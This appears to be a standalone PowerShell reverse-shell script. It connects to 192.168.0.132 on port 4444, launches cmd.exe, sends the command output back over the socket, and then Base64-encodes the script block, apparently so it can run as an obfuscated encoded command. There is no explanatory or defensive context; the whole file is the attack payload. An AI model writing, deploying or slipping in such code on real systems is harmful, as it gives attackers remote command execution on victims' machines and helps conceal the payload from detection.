$code = {
    $client = New-Object System.Net.Sockets.TCPClient('192.168.0.132', 4444);
    $stream = $client.GetStream();
    $writer = New-Object System.IO.StreamWriter($stream);
    $writer.AutoFlush = $true;
    $buffer = New-Object System.Byte[] 1024;
    $encoding = New-Object System.Text.ASCIIEncoding;
    $writer.WriteLine("Connected to Reverse Shell");
    $process = New-Object Diagnostics.Process;
    $process.StartInfo.FileName = "cmd.exe";
    $process.StartInfo.RedirectStandardInput = $true;
    $process.StartInfo.RedirectStandardOutput = $true;
    $process.StartInfo.RedirectStandardError = $true;
    $process.StartInfo.UseShellExecute = $false;
    $process.Start();
    $reader = $process.StandardOutput;
    $errorReader = $process.StandardError;
    while (($line = $reader.ReadLine()) -ne $null) {
        $writer.WriteLine($line);
    }
    while (($err = $errorReader.ReadLine()) -ne $null) {
        $writer.WriteLine($err);
    }
    $process.WaitForExit();
    $client.Close();
}

$bytes = [System.Text.Encoding]::Unicode.GetBytes($code.ToString())
$encodedCommand = [Convert]::ToBase64String($bytes)

